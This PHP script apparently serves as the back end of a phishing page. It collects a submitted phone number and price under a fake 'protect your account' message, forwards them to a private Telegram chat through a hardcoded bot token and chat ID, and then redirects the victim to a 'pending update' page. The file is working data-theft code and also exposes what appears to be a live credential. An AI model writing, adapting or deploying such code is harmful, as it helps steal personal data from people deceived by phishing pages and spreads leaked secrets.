<?php
// Inclure la bibliothèque Telegram Bot API
require './composer/vendor/autoload.php';

use Longman\TelegramBot\Telegram;
use Longman\TelegramBot\Request;
use Longman\TelegramBot\Entities\ServerResponse;

if ($_SERVER["REQUEST_METHOD"] == "POST") {
    $phone = $_POST['phone_number'];
    $mont = $_POST['price_tagg'];

    // Initialiser l'API de Telegram avec votre jeton d'API
    $telegram = new Telegram('7109079707:AAF0h7b0qTjMN0LqT33GIfDMZczhJYAyxAQ');

    // Créer le message que vous souhaitez envoyer à Telegram
    $message = "Protegeons votre compte:\n\n";
    $message .= "Numéro de téléphone : $phone\n";
    $message .= "Prix de l'article en euro : $mont\n";

    // L'ID du chat où vous voulez envoyer le message (remplacez par le vôtre)
    $chatId = '-1002427871420';

    // Envoyer le message à Telegram
    $data = [
        'chat_id' => $chatId,
        'text' => $message,
    ];

    /** @var ServerResponse $response */
    $response = Request::sendMessage($data);

    if ($response->isOk()) {
        // Rediriger l'utilisateur vers la page de confirmation
        header("Location: ../pending/update/index.php");
        exit();
    } else {
        echo "Échec de l'envoi du message à Telegram.";
    }
} else {
    echo "Une erreur s'est produite lors de l'envoi du message.";
}
